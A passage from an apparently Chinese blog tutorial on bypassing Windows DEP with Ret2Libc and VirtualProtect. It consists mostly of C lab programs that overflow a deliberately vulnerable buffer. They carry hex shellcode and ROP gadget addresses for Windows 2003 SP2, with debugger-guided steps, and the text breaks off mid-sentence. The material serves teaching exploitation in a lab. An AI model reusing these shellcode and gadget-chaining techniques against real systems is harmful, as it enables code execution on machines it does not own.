class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE9\x77\xBE\x77&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x81\x71\xBA\x7C&quot;</span> <span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span> <span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\x3D\x68\xBE\x7C&quot;</span> <span class="comment">//pop esi retn</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\x9B\xF4\x87\x7C&quot;</span> <span class="comment">//retn 0x30</span></span><br><span class="line"><span class="string">&quot;\x17\xF5\x96\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line"><span class="string">&quot;\x23\x1E\x1A\x7D&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\xE9\x27\xFF\xFF&quot;</span> <span class="comment">//跳转到 shellcode 起始地址</span></span><br><span class="line"><span class="string">&quot;\xFF\x90\x90\x90&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(tt,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ret2libc-实战之利用-virtualprotect"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-virtualprotect"></a> Ret2Libc 实战之利用 VirtualProtect</h3><p>Optout 和 AlwaysON 模式下所有进程是默认开启 DEP，这时如果一个程序自身偶尔需要从堆栈中取指令，则会发生错误。为了解决这个问题微软提供了修改内存属性的 <strong>VirtualProtect 函数</strong>，该函数位于 kernel32.dll 中，该函数可以修改指定内存的属性，包括是否可执行属性。因此只要我们在栈帧中布置好合适的参数，并让程序转入 VirtualProtect 函数执行，就可以将 shellcode 所在内存设置为可执行状态，进而绕过 DEP。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">LPVOID lpAddress,<span class="comment">//要改变属性的内存起始地址。</span></span></span><br><span class="line"><span class="params">DWORD dwSize,<span class="comment">//要改变属性的内存区域大小。</span></span></span><br><span class="line"><span class="params">DWORD flNewProtect,<span class="comment">//内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（ 0x40）时该内存页为可读可写可执行。</span></span></span><br><span class="line"><span class="params">PDWORD lpflOldProtect<span class="comment">//内存原始属性类型保存地址。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//修改内存属性成功时函数返回非 0，修改失败时返回 0。  </span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620151956530-165629394983517.png" alt="image-20220620151956530"></p><p>[EBP+C]和[EBP+10]这两个参数是固定的，[EBP+8]和[EBP+14]这两个参数是动态确定的，要保证[EBP+8]可以落在我们可以控制的堆栈范围内，[EBP+14]要保证为一可写地址。</p><p>按照如下参数布置好栈帧就可以将 shellcode 所在内存区域设置为可执行模式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">shellcode 所在内存空间起始地址,</span></span><br><span class="line"><span class="params">shellcode 大小,</span></span><br><span class="line"><span class="params"><span class="number">0x40</span>,</span></span><br><span class="line"><span class="params">某个可写地址</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意：<br>（ 1）参数中包含 0x00，strcpy 在复制字符串的时候会被截断，所以我们不能攻击 strcpy 函数，改为攻击 memcpy 函数。<br>（ 2）对 shellcode 所在内存空间起始地址的确定，不同机器之间 shellcode 在内存中的位置可能会有变化，本次实验中我们在栈帧中<strong>构造方法动态确定 shellcode 所在内存空间起始地址。</strong></p></blockquote><hr><h4 id="实验代码-2"><a class="markdownIt-Anchor" href="#实验代码-2"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span> <span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span> <span class="comment">//pop pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line">    <span class="string">&quot;\x8B\x17\x84\x7C&quot;</span> <span class="comment">//RETN</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span> <span class="comment">//修改内存大小</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">//可读可写可执行内存属性代码</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span> <span class="comment">//修改内存属性</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xA4\xDE\xA2\x7C&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,shellcode,<span class="number">420</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路-2"><a class="markdownIt-Anchor" href="#实验思路-2"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。<br>（ 3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualProtect 函数将 shellcode 所在内存区域设置为可执行模式。<br>（ 4）通过 push esp jmp eax 指令序列动态设置 VirtualProtect 函数中的 shellcode 所在内存起始地址以及内存原始属性类型保存地址。<br>（ 5）内存区域被设置成可执行模式后 shellcode 就可以正常执行了。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2003 SP2</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤-2"><a class="markdownIt-Anchor" href="#实验步骤-2"></a> 实验步骤：</h4><p><strong>（ 1）由于溢出时，EBP被覆盖破坏，先修复 EBP（把 ESP赋值给 EBP）</strong></p><p>用 PUSH ESP POP EBP RETN 4 指令的地址（0x77ECE353）覆盖 test 函数的返回地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x53\xe3\xec\x77&quot;</span> <span class="comment">//修正 EBP 77ECE353</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624203825690-165629394983518.png" alt="image-20220624203825690"></p><p>retn  4 返回到 0x0012FE70（ebp+0x8） 处存储的地址（0x00000000）执行，如下图所示</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624204155092-165629394983519.png" alt="image-20220624204155092"></p><p><strong>（ 2）利用 VirtualProtect 函数将 shellcode 所在内存区域设置为可执行模式</strong></p><ol><li>修改属性的内存地址（ebp+0x8）设置为当前堆栈中的某个地址</li></ol><p>现在我们的目标是动态覆盖掉 ebp+0x14，ebp+0x8，而要保证 ebp+0x10，ebp+0xC不变（由上面的分析可知，ebp+0x10，ebp+0xC 是两个固定参数）。</p><p>现在 ESP 刚好指向 EBP+8 的位置，如果此时我们能找到类似 MOV [EBP],** POP ** POP ** POP ** RETN 或者 MOV [EBP],** JMP **的指令就可以将要修改属性的内存地址设置为当前堆栈中的某个地址了。但是我们并没有找到这样的指令，我们不妨让 ESP 向下移动 4 个字节，然后执行一条 PUSH ESP RETN/JMP EAX 指令也能达到目的。那么什么样的指令能让 ESP 向高址方向移动 4字节，而不影响程序的控制？RETN指令，既能让 esp+4 又能收回程序控制权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x53\xe3\xec\x77&quot;</span> <span class="comment">//修正 EBP 77ECE353</span></span><br><span class="line"> <span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>运行调试。在 0x7CBBD9BA（调整EBP 入口）处下断点。运行到 JMP EAX 时暂停程序，观察当前内存状态。如下图所示，已经成功将 EBP+0x8 写为当前堆栈中的地址。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626101743336-165629394983520.png" alt="image-20220626101743336"></p><ol start="2"><li>保证 EBP+0x14 处存放的地址为可写地址</li></ol><p>让 ESP 指向 EBP+0x18，再用 PUSH ESP JMP EAX 指令来设置 EBP+0x14 的参数。</p><p>（1）观察堆栈，此时 ESP=0x0012FE70，EBP+0x14=0x0012FE7C，只需让 ESP 向高址方向移动 16 个字节，就能让 ESP 指向 EBP+0x18（=0x0012FE80）。使用类似 POP POP POP RETN指令（注意：不能修改 ESP、EBP、EAX）选用 0x7CBF1A0A 处的 POP ESI POP EBX POP EDI RETN 指令。</p><p>（2）用 PUSH ESP JMP EAX 指令设置 EBP+0x14 的参数。先要重新获得程序控制权，当前正在执行 jmp eax，所以要先使用 POP EAX RETN 指令地址覆盖 test() 返回地址，来将 0x7CBF1A0A 赋值给 EAX，才能执行 POP POP POP RETN指令。</p><p>（3）确定那两个固定参数，shellcode大小 0xff 就足够弹框代码用了，那个常量就用0x40。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626110433976-165629394983521.png" alt="image-20220626110433976"></p><p>总结一下刚才的过程：<br> 1.首先通过pop eax ret将pop pop pop ret的地址保存到eax。<br> 2.修正ebp，由于是retn 4，所以要加4个字节的90填充。<br> 3.执行push esp，jmp eax，此时通过ebp索引的参数值已经可以对上号了，除了那个可写的地址。</p><p>（4）接下来要把 ESP 写入到 EBP+0x14 处。用 push esp jmp eax 来把 EBP+0x14 写为可写入地址。然后在执行完 pop pop pop retn 后返回到 virtualProtect() 来把 Shellcode 设置为可执行页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span><span class="comment">//修改内存属性</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626105048718-165629394983522.png" alt="image-20220626105048718"></p><p>如下图所示，EAX 的值为 1， 根据 